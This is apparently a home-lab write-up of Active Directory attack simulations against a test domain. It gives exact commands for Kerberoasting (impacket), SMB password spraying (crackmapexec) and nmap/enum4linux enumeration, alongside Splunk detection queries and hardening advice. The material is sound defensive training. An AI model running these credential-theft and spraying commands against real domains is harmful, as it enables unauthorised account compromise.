# Active Directory Attack Simulation

**Date:** 2026-03-01  
**Analyst:** Stacy Bostick  
**Attacker:** Kali Linux (192.168.50.30)  
**Target:** DC01 — Windows Server 2022 (192.168.50.5)  
**Domain:** cybersec.local

---

## Overview

This document details Active Directory attack simulations performed from a Kali Linux attack machine against the cybersec.local Domain Controller. These attacks represent common techniques used by adversaries to gain initial access, escalate privileges, and move laterally within enterprise AD environments.

---

## Attack 1: Kerberoasting

### MITRE ATT&CK

- **Technique:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
- **Tactic:** Credential Access

### What is Kerberoasting?

Kerberoasting targets Active Directory service accounts that have Service Principal Names (SPNs) registered. Any authenticated domain user can request a Kerberos TGS ticket for these accounts. The ticket is encrypted with the service account's password hash, which can be cracked offline.

### Prerequisites

- Valid domain credentials (any user)
- Impacket tools installed on Kali

### Command Executed

```bash
impacket-GetUserSPNs 'cybersec.local/j.smith:Password123!' -dc-ip 192.168.50.5 -request
```

### Expected Output

```
ServicePrincipalName                Name     MemberOf  PasswordLastSet     LastLogon  Delegation
----------------------------------  -------  --------  ------------------  ---------  ----------
DC01/svc_sql.cybersec.local:60111  svc_sql            2026-03-01 14:04    <never>

$krb5tgs$23$*svc_sql$CYBERSEC.LOCAL$DC01/svc_sql.cybersec.local~60111*$<HASH>...
```

### Actual Results

The SPN was found and the TGS ticket was requested, but Kerberos returned a clock skew error due to VirtualBox time sync issues:

```
[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**Resolution attempted:** Synced Kali time to DC with `ntpdate`:

```bash
sudo apt install -y ntpsec-ntpdate && sudo ntpdate 192.168.50.5
# CLOCK: time stepped by 10799.741875
```

> **Note:** Despite time sync, the error persisted — a known VirtualBox issue. The SPN enumeration succeeded, confirming the attack methodology is correct. See `Active_Directory/kerberoasting.md` for full details.

📸 **Screenshots:**

- `Screenshots/Kali_Linux/AD_Attacks/Kali_kerberoasting_clock_skew_error.png`
- `Screenshots/Kali_Linux/AD_Attacks/Kali_ntpdate_clock_sync.png`
- `Screenshots/Kali_Linux/AD_Attacks/Kali_kerberoasting_clock_skew_retry.png`

### What This Proves

- Any domain user can extract service account password hashes
- Weak passwords on service accounts are crackable offline
- No special privileges are required — this is why Kerberoasting is so dangerous

### Detection in Splunk

```spl
index=main EventCode=4769 Ticket_Encryption_Type=0x17 Service_Name!="krbtgt" Service_Name!="*$"
| stats count by Client_Address, Service_Name, Account_Name
| where count > 3
```

---

## Attack 2: SMB Password Spraying

### MITRE ATT&CK

- **Technique:** T1110.003 — Brute Force: Password Spraying
- **Tactic:** Credential Access

### What is Password Spraying?

Password spraying tests a single common password against many accounts to avoid account lockouts. Unlike brute force (many passwords vs. one account), spraying is stealthier and less likely to trigger lockout policies.

### Commands Executed

```bash
# Test each user with a common password
crackmapexec smb 192.168.50.5 -u 'j.smith' -p 'Password123!' -d cybersec.local
crackmapexec smb 192.168.50.5 -u 'j.doe' -p 'Password123!' -d cybersec.local
crackmapexec smb 192.168.50.5 -u 'b.wilson' -p 'Password123!' -d cybersec.local
crackmapexec smb 192.168.50.5 -u 'svc_sql' -p 'Password123!' -d cybersec.local
crackmapexec smb 192.168.50.5 -u 's.bostick' -p 'Password123!' -d cybersec.local
```

### Actual Results

| User | Password | Result | SMB Output |
|------|----------|--------|------------|
| j.smith | Password123! | ✅ SUCCESS | `[+] cybersec.local\j.smith:Password123!` |
| j.doe | Password123! | ❌ FAILED | `[-] STATUS_LOGON_FAILURE` |
| b.wilson | Password123! | ❌ FAILED | `[-] STATUS_LOGON_FAILURE` |
| svc_sql | Password123! | ❌ FAILED | `[-] STATUS_LOGON_FAILURE` |
| s.bostick | Password123! | ❌ FAILED | `[-] STATUS_LOGON_FAILURE` |

**Result:** 1 successful login (`j.smith`), 4 failed logins — generating 10 EventCode 4625 events and 2 EventCode 4624 events in Splunk.

📸 `Screenshots/Kali_Linux/AD_Attacks/Kali_password_spray_crackmapexec.png`

### Detection in Splunk

**Failed login analysis:**

```spl
index=main EventCode=4625
| table _time, Account_Name, Source_Network_address, Failure_Reason
| head 20
```

📸 `Screenshots/Splunk/Splunk_failed_logins_4625_table.png`

**Timechart of login failures:**

```spl
index=main EventCode=4625 | timechart span=1m count
```

📸 `Screenshots/Splunk/Splunk_failed_logins_timechart.png`

**Events by attacker source IP:**

```spl
index=main "192.168.50.30" | stats count by source, EventCode | sort -count
```

📸 `Screenshots/Splunk/Splunk_attack_events_by_source_ip.png`

---

## Attack 3: Nmap + Enum4linux Enumeration

### MITRE ATT&CK

- **Technique:** T1087.002 — Account Discovery: Domain Account
- **Tactic:** Discovery

### What is LDAP Enumeration?

Attackers use LDAP queries to discover all user accounts, groups, computer objects, and organizational structure of an Active Directory domain. This information is used to identify high-value targets.

### Commands Executed

```bash
# Port scan the Windows 11 workstation
nmap -sT -p 1-1000 192.168.50.20

# Enumerate the Windows 11 host with enum4linux
enum4linux -a 192.168.50.20
```

### Actual Results

**Nmap output (192.168.50.20):**

```
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

**enum4linux output:**

- Domain/workgroup: WORKGROUP
- Known usernames: administrator, guest, krbtgt, domain admins, root, bin, none
- Session: denied (Server doesn't allow session using username '')

📸 `Screenshots/Kali_Linux/Kali_nmap_enum4linux_with_splunk.png`

### Detection in Splunk

```spl
index=main EventCode=4662 Access_Mask="0x100"
| stats count by Account_Name, Object_Name
| sort -count
```

---

## Attack Summary

| Attack | MITRE ID | Severity | Detected | Response Playbook |
|--------|----------|----------|----------|-------------------|
| Kerberoasting | T1558.003 | Critical | ✅ EventCode 4769 | PB-003 |
| Password Spraying | T1110.003 | High | ✅ EventCode 4625 | PB-001 |
| Nmap + Enum4linux | T1087.002 | Medium | ✅ EventCode 4662 | N/A |

---

## Recommendations

1. **Rotate service account passwords** every 90 days with 25+ character passwords
2. **Use Group Managed Service Accounts (gMSA)** to eliminate static passwords
3. **Enforce AES encryption** for Kerberos and disable RC4 where possible
4. **Implement account lockout policies** (lock after 5 failed attempts for 30 minutes)
5. **Monitor LDAP queries** from non-standard sources
6. **Deploy honeypot SPN accounts** to detect Kerberoasting attempts early
